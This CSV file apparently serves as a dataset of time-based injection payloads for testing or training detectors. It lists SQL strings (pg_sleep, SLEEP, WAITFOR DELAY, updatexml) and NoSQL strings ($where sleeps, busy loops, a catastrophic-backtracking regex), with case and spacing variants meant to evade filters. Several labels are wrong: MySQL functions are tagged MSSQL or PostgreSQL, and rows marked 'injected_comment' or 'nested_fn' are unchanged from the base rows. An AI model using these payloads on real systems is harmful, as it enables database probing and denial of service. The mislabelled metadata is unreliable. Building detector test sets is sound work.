Query,platform,base_type,original_id,transform_type,delay_value,obfuscation
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MSSQL,boolean_or_error,485,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MSSQL,boolean_or_error,486,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MSSQL,boolean_or_error,487,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MSSQL,boolean_or_error,488,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MSSQL,boolean_or_error,489,time-based-blind,10,none
'+WAITFOR+DELAY+'00:00:10';--,MSSQL,direct_time,490,time-based-none,10,none
'+WAITFOR+DELAY+'00:00:10';--,MSSQL,direct_time,491,time-based-injected_comment,10,injected_comment
'+WAITFOR+DELAY+'00:00:10';--,MSSQL,direct_time,492,time-based-extra_spaces,10,extra_spaces
'+WAITFOR+DELAY+'00:00:10';--,MSSQL,direct_time,493,time-based-nested_fn,10,nested_fn
'+waitFOr+DeLaY+'00:00:10';--,MSSQL,direct_time,494,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,495,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',PostgreSQL,boolean_or_error,496,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",PostgreSQL,boolean_or_error,497,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,PostgreSQL,boolean_or_error,498,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",PostgreSQL,boolean_or_error,499,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",PostgreSQL,boolean_or_error,500,time-based-blind,1,none
'; SELECT pg_sleep(1); --,PostgreSQL,direct_time,501,time-based-none,1,none
'; SELECT pg_sleep(1); --,PostgreSQL,direct_time,502,time-based-injected_comment,1,injected_comment
';     SELECT    pg_sleep(1);     --,PostgreSQL,direct_time,503,time-based-extra_spaces,1,extra_spaces
'; SELECT pg_sleep(1); --,PostgreSQL,direct_time,504,time-based-nested_fn,1,nested_fn
'; SeLeCT pG_SleeP(1); --,PostgreSQL,direct_time,505,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,506,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',PostgreSQL,boolean_or_error,507,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",PostgreSQL,boolean_or_error,508,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,PostgreSQL,boolean_or_error,509,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",PostgreSQL,boolean_or_error,510,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",PostgreSQL,boolean_or_error,511,time-based-blind,3,none
'; SELECT pg_sleep(3); --,PostgreSQL,direct_time,512,time-based-none,3,none
'; SELECT pg_sleep(3); --,PostgreSQL,direct_time,513,time-based-injected_comment,3,injected_comment
';     SELECT    pg_sleep(3);    --,PostgreSQL,direct_time,514,time-based-extra_spaces,3,extra_spaces
'; SELECT pg_sleep(3); --,PostgreSQL,direct_time,515,time-based-nested_fn,3,nested_fn
'; SELECt pg_SLeeP(3); --,PostgreSQL,direct_time,516,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,517,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',PostgreSQL,boolean_or_error,518,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",PostgreSQL,boolean_or_error,519,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,PostgreSQL,boolean_or_error,520,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",PostgreSQL,boolean_or_error,521,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",PostgreSQL,boolean_or_error,522,time-based-blind,5,none
'; SELECT pg_sleep(5); --,PostgreSQL,direct_time,523,time-based-none,5,none
'; SELECT pg_sleep(5); --,PostgreSQL,direct_time,524,time-based-injected_comment,5,injected_comment
';   SELECT   pg_sleep(5);     --,PostgreSQL,direct_time,525,time-based-extra_spaces,5,extra_spaces
'; SELECT pg_sleep(5); --,PostgreSQL,direct_time,526,time-based-nested_fn,5,nested_fn
'; SElEct pg_SleEp(5); --,PostgreSQL,direct_time,527,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,528,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',PostgreSQL,boolean_or_error,529,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",PostgreSQL,boolean_or_error,530,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,PostgreSQL,boolean_or_error,531,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",PostgreSQL,boolean_or_error,532,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",PostgreSQL,boolean_or_error,533,time-based-blind,7,none
'; SELECT pg_sleep(7); --,PostgreSQL,direct_time,534,time-based-none,7,none
'; SELECT pg_sleep(7); --,PostgreSQL,direct_time,535,time-based-injected_comment,7,injected_comment
';    SELECT  pg_sleep(7);  --,PostgreSQL,direct_time,536,time-based-extra_spaces,7,extra_spaces
'; SELECT pg_sleep(7); --,PostgreSQL,direct_time,537,time-based-nested_fn,7,nested_fn
'; sElECt pg_sleep(7); --,PostgreSQL,direct_time,538,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,539,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',PostgreSQL,boolean_or_error,540,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",PostgreSQL,boolean_or_error,541,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,PostgreSQL,boolean_or_error,542,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",PostgreSQL,boolean_or_error,543,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",PostgreSQL,boolean_or_error,544,time-based-blind,10,none
'; SELECT pg_sleep(10); --,PostgreSQL,direct_time,545,time-based-none,10,none
'; SELECT pg_sleep(10); --,PostgreSQL,direct_time,546,time-based-injected_comment,10,injected_comment
';  SELECT     pg_sleep(10);    --,PostgreSQL,direct_time,547,time-based-extra_spaces,10,extra_spaces
'; SELECT pg_sleep(10); --,PostgreSQL,direct_time,548,time-based-nested_fn,10,nested_fn
'; SElEct Pg_slEEp(10); --,PostgreSQL,direct_time,549,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,550,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',PostgreSQL,boolean_or_error,551,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",PostgreSQL,boolean_or_error,552,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,PostgreSQL,boolean_or_error,553,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",PostgreSQL,boolean_or_error,554,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",PostgreSQL,boolean_or_error,555,time-based-blind,1,none
' OR pg_sleep(1) --,PostgreSQL,direct_time,556,time-based-none,1,none
' OR pg_sleep(1) --,PostgreSQL,direct_time,557,time-based-injected_comment,1,injected_comment
'    OR     pg_sleep(1)    --,PostgreSQL,direct_time,558,time-based-extra_spaces,1,extra_spaces
' OR pg_sleep(1) --,PostgreSQL,direct_time,559,time-based-nested_fn,1,nested_fn
' oR Pg_sLeep(1) --,PostgreSQL,direct_time,560,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,561,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',PostgreSQL,boolean_or_error,562,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",PostgreSQL,boolean_or_error,563,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,PostgreSQL,boolean_or_error,564,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",PostgreSQL,boolean_or_error,565,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",PostgreSQL,boolean_or_error,566,time-based-blind,3,none
' OR pg_sleep(3) --,PostgreSQL,direct_time,567,time-based-none,3,none
' OR pg_sleep(3) --,PostgreSQL,direct_time,568,time-based-injected_comment,3,injected_comment
'     OR   pg_sleep(3)     --,PostgreSQL,direct_time,569,time-based-extra_spaces,3,extra_spaces
' OR pg_sleep(3) --,PostgreSQL,direct_time,570,time-based-nested_fn,3,nested_fn
' OR Pg_sLeeP(3) --,PostgreSQL,direct_time,571,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,572,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',PostgreSQL,boolean_or_error,573,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",PostgreSQL,boolean_or_error,574,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,PostgreSQL,boolean_or_error,575,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",PostgreSQL,boolean_or_error,576,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",PostgreSQL,boolean_or_error,577,time-based-blind,5,none
' OR pg_sleep(5) --,PostgreSQL,direct_time,578,time-based-none,5,none
' OR pg_sleep(5) --,PostgreSQL,direct_time,579,time-based-injected_comment,5,injected_comment
'     OR  pg_sleep(5)  --,PostgreSQL,direct_time,580,time-based-extra_spaces,5,extra_spaces
' OR pg_sleep(5) --,PostgreSQL,direct_time,581,time-based-nested_fn,5,nested_fn
' Or PG_sleEp(5) --,PostgreSQL,direct_time,582,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,583,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',PostgreSQL,boolean_or_error,584,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",PostgreSQL,boolean_or_error,585,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,PostgreSQL,boolean_or_error,586,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",PostgreSQL,boolean_or_error,587,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",PostgreSQL,boolean_or_error,588,time-based-blind,7,none
' OR pg_sleep(7) --,PostgreSQL,direct_time,589,time-based-none,7,none
' OR pg_sleep(7) --,PostgreSQL,direct_time,590,time-based-injected_comment,7,injected_comment
'    OR  pg_sleep(7)    --,PostgreSQL,direct_time,591,time-based-extra_spaces,7,extra_spaces
' OR pg_sleep(7) --,PostgreSQL,direct_time,592,time-based-nested_fn,7,nested_fn
' Or Pg_SleEP(7) --,PostgreSQL,direct_time,593,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,594,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',PostgreSQL,boolean_or_error,595,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",PostgreSQL,boolean_or_error,596,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,PostgreSQL,boolean_or_error,597,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",PostgreSQL,boolean_or_error,598,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",PostgreSQL,boolean_or_error,599,time-based-blind,10,none
' OR pg_sleep(10) --,PostgreSQL,direct_time,600,time-based-none,10,none
' OR pg_sleep(10) --,PostgreSQL,direct_time,601,time-based-injected_comment,10,injected_comment
'   OR     pg_sleep(10)   --,PostgreSQL,direct_time,602,time-based-extra_spaces,10,extra_spaces
' OR pg_sleep(10) --,PostgreSQL,direct_time,603,time-based-nested_fn,10,nested_fn
' OR PG_SLEeP(10) --,PostgreSQL,direct_time,604,time-based-mixed_case,10,mixed_case
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,605,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',PostgreSQL,boolean_or_error,606,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",PostgreSQL,boolean_or_error,607,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,PostgreSQL,boolean_or_error,608,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",PostgreSQL,boolean_or_error,609,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",PostgreSQL,boolean_or_error,610,time-based-blind,1,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(1) END) --,PostgreSQL,direct_time,611,time-based-none,1,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(1) END) --,PostgreSQL,direct_time,612,time-based-injected_comment,1,injected_comment
'     AND     (SELECT   CASE  WHEN    (1=1)   THEN    pg_sleep(1)  END)     --,PostgreSQL,direct_time,613,time-based-extra_spaces,1,extra_spaces
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(1) END) --,PostgreSQL,direct_time,614,time-based-nested_fn,1,nested_fn
' AND (seLeCt cAse WHeN (1=1) tHEN PG_SLEep(1) EnD) --,PostgreSQL,direct_time,615,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,616,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',PostgreSQL,boolean_or_error,617,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",PostgreSQL,boolean_or_error,618,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,PostgreSQL,boolean_or_error,619,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",PostgreSQL,boolean_or_error,620,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",PostgreSQL,boolean_or_error,621,time-based-blind,3,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) END) --,PostgreSQL,direct_time,622,time-based-none,3,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) END) --,PostgreSQL,direct_time,623,time-based-injected_comment,3,injected_comment
'    AND    (SELECT    CASE  WHEN  (1=1)    THEN     pg_sleep(3)     END)  --,PostgreSQL,direct_time,624,time-based-extra_spaces,3,extra_spaces
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) END) --,PostgreSQL,direct_time,625,time-based-nested_fn,3,nested_fn
' anD (sELEcT cASE WHen (1=1) ThEn pg_slEEP(3) eNd) --,PostgreSQL,direct_time,626,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,627,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',PostgreSQL,boolean_or_error,628,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",PostgreSQL,boolean_or_error,629,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,PostgreSQL,boolean_or_error,630,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",PostgreSQL,boolean_or_error,631,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",PostgreSQL,boolean_or_error,632,time-based-blind,5,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END) --,PostgreSQL,direct_time,633,time-based-none,5,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END) --,PostgreSQL,direct_time,634,time-based-injected_comment,5,injected_comment
'  AND  (SELECT   CASE     WHEN   (1=1)    THEN   pg_sleep(5)     END)    --,PostgreSQL,direct_time,635,time-based-extra_spaces,5,extra_spaces
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END) --,PostgreSQL,direct_time,636,time-based-nested_fn,5,nested_fn
' AND (selEct casE WHen (1=1) THen pg_sLeeP(5) enD) --,PostgreSQL,direct_time,637,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,638,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',PostgreSQL,boolean_or_error,639,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",PostgreSQL,boolean_or_error,640,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,PostgreSQL,boolean_or_error,641,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",PostgreSQL,boolean_or_error,642,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",PostgreSQL,boolean_or_error,643,time-based-blind,7,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(7) END) --,PostgreSQL,direct_time,644,time-based-none,7,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(7) END) --,PostgreSQL,direct_time,645,time-based-injected_comment,7,injected_comment
'   AND    (SELECT   CASE   WHEN     (1=1)     THEN     pg_sleep(7)     END)    --,PostgreSQL,direct_time,646,time-based-extra_spaces,7,extra_spaces
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(7) END) --,PostgreSQL,direct_time,647,time-based-nested_fn,7,nested_fn
' ANd (Select CasE WheN (1=1) theN pg_SleEP(7) enD) --,PostgreSQL,direct_time,648,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,PostgreSQL,boolean_or_error,649,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',PostgreSQL,boolean_or_error,650,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",PostgreSQL,boolean_or_error,651,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,PostgreSQL,boolean_or_error,652,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",PostgreSQL,boolean_or_error,653,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",PostgreSQL,boolean_or_error,654,time-based-blind,10,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) END) --,PostgreSQL,direct_time,655,time-based-none,10,none
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) END) --,PostgreSQL,direct_time,656,time-based-injected_comment,10,injected_comment
'  AND   (SELECT   CASE    WHEN   (1=1)   THEN    pg_sleep(10)    END)   --,PostgreSQL,direct_time,657,time-based-extra_spaces,10,extra_spaces
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) END) --,PostgreSQL,direct_time,658,time-based-nested_fn,10,nested_fn
' anD (SELECT caSE When (1=1) then Pg_sleEp(10) enD) --,PostgreSQL,direct_time,659,time-based-mixed_case,10,mixed_case
"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 1000){}; return true; }"" }",NoSQL,nosql_time,660,nosql-time,1,none
"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 3000){}; return true; }"" }",NoSQL,nosql_time,661,nosql-time,3,none
"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 5000){}; return true; }"" }",NoSQL,nosql_time,662,nosql-time,5,none
"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 7000){}; return true; }"" }",NoSQL,nosql_time,663,nosql-time,7,none
"{""$where"": ""function() { var start = new Date(); while(new Date()-start < 10000){}; return true; }"" }",NoSQL,nosql_time,664,nosql-time,10,none
"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,665,nosql-time,1,none
"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,666,nosql-time,3,none
"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,667,nosql-time,5,none
"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,668,nosql-time,7,none
"{""username"": { ""$regex"": "".*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*"" } }",NoSQL,nosql_time,669,nosql-time,10,none
"{""$where"": ""sleep(1)""}",NoSQL,nosql_time,670,nosql-time,1,none
"{""$where"": ""sleep(3)""}",NoSQL,nosql_time,671,nosql-time,3,none
"{""$where"": ""sleep(5)""}",NoSQL,nosql_time,672,nosql-time,5,none
"{""$where"": ""sleep(7)""}",NoSQL,nosql_time,673,nosql-time,7,none
"{""$where"": ""sleep(10)""}",NoSQL,nosql_time,674,nosql-time,10,none
"{""$where"": ""for(i=0;i<1e5;i++){{}}; return true; ""}",NoSQL,nosql_time,675,nosql-time,1,none
"{""$where"": ""for(i=0;i<1e7;i++){{}}; return true; ""}",NoSQL,nosql_time,676,nosql-time,3,none
"{""$where"": ""for(i=0;i<1e9;i++){{}}; return true; ""}",NoSQL,nosql_time,677,nosql-time,5,none
"{""$where"": ""for(i=0;i<1e11;i++){{}}; return true; ""}",NoSQL,nosql_time,678,nosql-time,7,none
"{""$where"": ""for(i=0;i<1e14;i++){{}}; return true; ""}",NoSQL,nosql_time,679,nosql-time,10,none
